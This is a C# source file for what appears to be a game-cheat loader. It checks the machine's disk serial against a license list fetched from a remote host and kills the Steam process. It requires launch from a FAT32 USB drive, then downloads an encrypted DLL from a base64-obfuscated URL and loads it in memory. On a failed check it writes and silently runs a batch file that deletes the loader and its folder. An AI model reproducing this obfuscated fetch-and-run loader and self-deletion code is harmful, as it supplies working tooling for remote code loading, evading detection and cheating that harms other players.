using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.Reflection;
using System.Windows.Forms;
using System.Net;
using Encode;

namespace SecuritySpace
{
    class Security
    {
        #region Variables
        private static uint serial_number = 0;
        private static uint max_component_length = 0;
        private static StringBuilder sb_volume_name = new StringBuilder(256);
        private static UInt32 file_system_flags = new UInt32();
        private static StringBuilder sb_file_system_name = new StringBuilder(256);
        #endregion

        #region Public_Methods
        #region Main_Method
        /// <summary>
        /// Main method from SecuritySpace
        /// </summary>
        public static void Do()
        {
            if (CheckHWID(Crypt.Decode(/*C:\\*/"QzpcXA")))
            {
                DeleteLoader();
            }
            CheckSteam();
            CheckUSB();
            LoadCheat(/*http://zurrapa.host/zurr*/"aHR0cDovL3p1cnJhcGEuaG9zdC96dXJy");
        }
        #endregion

        /// <summary>
        /// Returns the serial number from Security.serial_number in string format
        /// </summary>
        public static string serial
        {
            get
            {
                return serial_number.ToString();
            }
        }
        #endregion

        #region Private_Methods
        /// <summary>
        /// Closes Steam.exe
        /// </summary>
        private static void CheckSteam()
        {
            try
            {
                Process.GetProcessesByName(Crypt.Decode(/*steam*/"c3RlYW0"))[0].Kill();
                Console.WriteLine(Crypt.Decode(/*[ + ] Steam has been closed*/"WyArIF0gU3RlYW0gaGFzIGJlZW4gY2xvc2Vk"));
            }
            catch (Exception)
            {
                Console.WriteLine(Crypt.Decode(/*[ + ] Steam is already closed*/"WyArIF0gU3RlYW0gaXMgYWxyZWFkeSBjbG9zZWQ"));
            }
        }

        /// <summary>
        /// Loads a .dll
        /// </summary>
        /// <param name="base64URL">URL with .dll data to inject in process</param>
        private static void LoadCheat(string base64URL)
        {
            try
            {
                using (WebClient web = new WebClient())
                {                
                    DynamicDllLoader loader = new DynamicDllLoader();
                    loader.LoadLibrary(Crypt.Decrypt(web.DownloadData(Crypt.Decode(base64URL))));
                    //loader.LoadLibrary(web.DownloadData(Crypt.Decode(base64URL)));

                    //Zurrapa main = (Zurrapa)Marshal.GetDelegateForFunctionPointer( (IntPtr)loader.GetProcAddress( Crypt.Decode( /*Zurrapa*/"WnVycmFwYQ") ), typeof(Zurrapa));

                    //main();
                }
            }
            catch
            {
                MessageBox.Show(Crypt.Decode(/*Something went wrong*/"U29tZXRoaW5nIHdlbnQgd3Jvbmc"), Crypt.Decode(/*Error*/"RXJyb3I"));
            }
            finally
            {
                Exit();
            }
        }

        /// <summary>
        /// Loops until user un-plug his usb 
        /// </summary>
        private static void CheckUSB()
        {
            DriveInfo driveInfo = new DriveInfo(Directory.GetDirectoryRoot(Directory.GetCurrentDirectory()));

            if (driveInfo.DriveType != DriveType.Removable)
            {
                MessageBox.Show(Crypt.Decode(/*Execute me from an USB*/"RXhlY3V0ZSBtZSBmcm9tIGFuIFVTQg"), Crypt.Decode(/*Error*/"RXJyb3I"));
                Exit();
            }

            if (driveInfo.DriveFormat != "FAT32")
            {
                MessageBox.Show(Crypt.Decode(/*Format your USB to FAT32*/"Rm9ybWF0IHlvdXIgVVNCIHRvIEZBVDMy"), Crypt.Decode(/*Error*/"RXJyb3I"));
                Exit();
            }

            Console.WriteLine(Crypt.Decode(/*[ + ] Un-plug the usb ...*/"WyArIF0gVW4tcGx1ZyB0aGUgdXNiIC4uLg"));
            for (int i = 0; i < 20 && driveInfo.IsReady; i++)
            {
                if (i == 19)
                {
                    MessageBox.Show(Crypt.Decode(/*Timeout ...*/"VGltZW91dCAuLi4"), Crypt.Decode(/*Error*/"RXJyb3I"));
                    Exit();
                }

                Thread.Sleep(1000);
            }

        }

        /// <summary>
        /// Check HDD serial number with serial numbers database
        /// </summary>
        /// <returns>Returns true if hwid checking fails</returns>
        private static bool CheckHWID(string diskLetter)
        {
            string line;

            GetVolumeInformation(diskLetter, sb_volume_name, (UInt32)sb_volume_name.Capacity,
                ref serial_number, ref max_component_length, ref file_system_flags, sb_file_system_name,
                (UInt32)sb_file_system_name.Capacity);

            using (WebClient web = new WebClient())
            {
                using (StringReader reader = new StringReader( web.DownloadString( Crypt.Decode( "aHR0cDovL3p1cnJhcGEuaG9zdC9zdWJz" ) ) ) )
                {
                    while ((line = reader.ReadLine()) != null)
                    {
                        if (!line.StartsWith("/") && Crypt.Decode(line).Equals(serial_number.ToString()))
                        {
                            return false;
                        }
                    }
                }
            }
            return true;
        }

        /// <summary>
        /// Deletes current process via .bat file
        /// </summary>
        private static void DeleteLoader()
        {    
            string temppath, current_path;

            temppath = Path.Combine(Path.GetTempPath(), Crypt.Decode(/*enVycmFwYWJhdA.bat*/"ZW5WeWNtRndZV0poZEEuYmF0"));
            current_path = Path.Combine(Directory.GetCurrentDirectory(), Assembly.GetExecutingAssembly().GetName().Name + Crypt.Decode(/*.exe*/"LmV4ZQ"));

            using (StreamWriter w = new StreamWriter(temppath))
            {
                w.WriteLine(":Repeat");
                w.WriteLine("del \"" + current_path + "\"");
                w.WriteLine("if exist \"" + current_path + "\" goto Repeat");
                w.WriteLine("rmdir \"" + Directory.GetCurrentDirectory() + "\"");
                w.WriteLine("del \"" + temppath + "\"");
                w.Close();
            }

            using (Process proc = new Process())
            {
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                proc.StartInfo.FileName = temppath;
                proc.Start();
            }

            Exit();
        }

        /// <summary>
        /// Enviroment exit
        /// </summary>
        private static void Exit()
        {
            Environment.Exit(0);
        }
        #endregion

        #region DLLImports
        [DllImport("kernel32.dll")]
        private static extern long GetVolumeInformation(
                string PathName,
                StringBuilder VolumeNameBuffer,
                UInt32 VolumeNameSize,
                ref UInt32 VolumeSerialNumber,
                ref UInt32 MaximumComponentLength,
                ref UInt32 FileSystemFlags,
                StringBuilder FileSystemNameBuffer,
                UInt32 FileSystemNameSize
            );

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll")]
        public static extern bool FreeLibrary(IntPtr hModule);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int Zurrapa();
        #endregion
    }
}



